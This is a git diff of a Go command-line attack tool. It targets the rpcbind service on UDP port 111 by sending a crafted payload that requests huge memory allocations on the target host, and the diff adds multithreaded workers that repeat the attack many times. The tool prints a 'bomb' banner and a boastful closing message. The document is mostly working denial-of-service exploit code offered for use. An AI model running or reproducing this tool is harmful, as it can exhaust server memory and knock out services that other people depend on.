@@ -11,11 +11,61 @@ import (
 	"time"
 )
 
+// Simple Error Checking function
 func CheckError(err error) {
 	if err != nil {
 		fmt.Println("Error: ", err)
 		os.Exit(0)
 	}
+}
+
+// UPD Connection Handler
+func handleUDPConnection(conn *net.UDPConn, payload *bytes.Buffer, threadid int) (int, []byte, *net.UDPAddr, error) {
+
+	_, err := conn.Write(payload.Bytes()) // Send UDP packet to Server
+	CheckError(err)                       // Check for errors from sending the packet
+
+	recievebuf := make([]byte, 1024)             // Receive Buffer
+	n, addr, err := conn.ReadFromUDP(recievebuf) // wait for response (Or Timeout)
+	conn.Close()                                 // Close connection
+
+	if err != nil {
+		fmt.Println("\nNo response from server received. Thread ID:", threadid)
+	}
+
+	return n, recievebuf, addr, err
+}
+
+// Thread Handler
+func WorkerThread(id int, numLoops int64, buf *bytes.Buffer, localhost *net.UDPAddr, remotehost *net.UDPAddr, tout int, result chan int) {
+
+	timeoutCount := 0 // Track No response from target
+
+	fmt.Printf("Payload Thread %[2]x: %[1]x\n", buf.Bytes(), id)
+
+	for i := 1; int64(i) <= numLoops; i++ {
+		conn, err := net.DialUDP("udp", localhost, remotehost) // setup the connection
+		CheckError(err)                                        // Check the error
+
+		timeOut := time.Now().Local().Add(time.Second * time.Duration(tout)) // Set Read timeout (10 Secs) variable
+		conn.SetReadDeadline(timeOut)                                        // Set the actual Timeout
+
+		n, bufR, addr, err := handleUDPConnection(conn, buf, id)
+
+		if err != nil {
+			timeoutCount++
+		}
+
+		if int64(i) == numLoops {
+			fmt.Println("\n\nThread:", id, "Report. Status: Success")
+			fmt.Printf("Received Messgae: %x", bufR[0:n])
+			fmt.Println(" from ", addr)
+			fmt.Println("Total Timeouts:", timeoutCount, "\n")
+		}
+
+		result <- 1
+	}
+	close(result)
 }
 
 func main() {
@@ -53,10 +103,11 @@ func main() {
 	`
 	fmt.Println(bomb)
 
-	ptrHost := flag.String("host", "REQUIRED", "This is the target host of the attack (IP Address)") // Create Host flag
-	ptrNumBytes := flag.Int("numbytes", 999999999, "This the number of bytes to try an allocate")    // create numBytes flag
-	ptrPort := flag.Int("port", 111, "This is the port RPC Bind is running on")                      // create Port flag
+	ptrHost := flag.String("host", "REQUIRED", "This is the target host of the attack (IP Address)") // Create Host Flag
+	ptrNumBytes := flag.Int("numbytes", 3999999999, "This the number of bytes to try an allocate")   // create numBytes Flag
+	ptrPort := flag.Int("port", 111, "This is the port RPC Bind is running on")                      // create Port Flag
 	ptrLoop := flag.Int64("loop", 1, "The number of times to loop (max=9223372036854775807)")        // Create Loop Flag
+	ptrThreads := flag.Int("threads", 1, "The number of threads (Workers) to launch the attack")     // Create threads Flag
 
 	flag.Parse() // Parse all Flags
 
@@ -86,41 +137,28 @@ func main() {
 
 	fmt.Printf("Payload: %x\n", buf.Bytes()) // Show Payload that will be sent
 
-	for i := 0; int64(i) < *ptrLoop+1; i++ {
-		serverAddr, err := net.ResolveUDPAddr("udp", *ptrHost+":"+strconv.Itoa(*ptrPort)) // Resolves the Attack Target
-		CheckError(err)                                                                   // Check the error
+	serverAddr, err := net.ResolveUDPAddr("udp", *ptrHost+":"+strconv.Itoa(*ptrPort)) // Resolves the Attack Target
+	CheckError(err)                                                                   // Check the error
 
-		localAddr, err := net.ResolveUDPAddr("udp", ":0") // Resolves localhost
-		CheckError(err)                                   // Check the error
+	localAddr, err := net.ResolveUDPAddr("udp", ":0") // Resolves localhost
+	CheckError(err)                                   // Check the error
 
-		conn, err := net.DialUDP("udp", localAddr, serverAddr) // setup the connection
-		CheckError(err)                                        // Check the error
+	loopCount := *ptrLoop / int64(*ptrThreads)
+	fmt.Println("Loop Count per Thread:", loopCount)
+	status := make(chan int)
+	for i := 0; i < *ptrThreads; i++ {
 
-		timeOut := time.Now().Local().Add(time.Second * time.Duration(30)) // Set Read timeout (10 Secs) variable
-		conn.SetReadDeadline(timeOut)                                      // Set the actual Timeout
+		go WorkerThread(i, int64(loopCount), buf, localAddr, serverAddr, 10, status)
 
-		//conn.Close() // Close connection
-
-		_, errr := conn.Write(buf.Bytes()) // Send UDP packet to Server
-
-		CheckError(errr) // Check for errors from sending the packet
-		//buf.Reset() // reset the buffer
-
-		bufR := make([]byte, 1024)             // Receive Buffer
-		n, addr, err := conn.ReadFromUDP(bufR) // wait for response (Or Timeout)
-		conn.Close()                           // Close connection
-		if err != nil {
-			fmt.Println("No response from server received.")
-		} else if int64(i) == *ptrLoop {
-			fmt.Println("Allocated", *ptrNumBytes*i, "bytes at host", *ptrHost, "on port", *ptrPort)
-			fmt.Printf("Received Messgae: %x", bufR[0:n])
-			fmt.Println(" from ", addr)
-			fmt.Println("\nDamn it feels good to be a gangster.")
-		} else {
-			now := time.Now()            // Capture the time at this point
-			elapse := now.Sub(startTime) // calculate the time difference between now and when the program started
-
-			fmt.Printf("\r Loop %[1]d/%[2]d - Elapsed Time: %[3]v", i, *ptrLoop, elapse)
-		}
 	}
+
+	currentloop := 0
+	for loopfin := range status {
+		currentloop += loopfin
+		now := time.Now()            // Capture the time at this point
+		elapse := now.Sub(startTime) // calculate the time difference between now and when the program started
+
+		fmt.Printf("\r Loop %[1]d/%[2]d - Elapsed Time: %[3]v", currentloop, *ptrLoop, elapse)
+	}
+	fmt.Println("\n\nDamn it feels good to be a gangster.")
 }
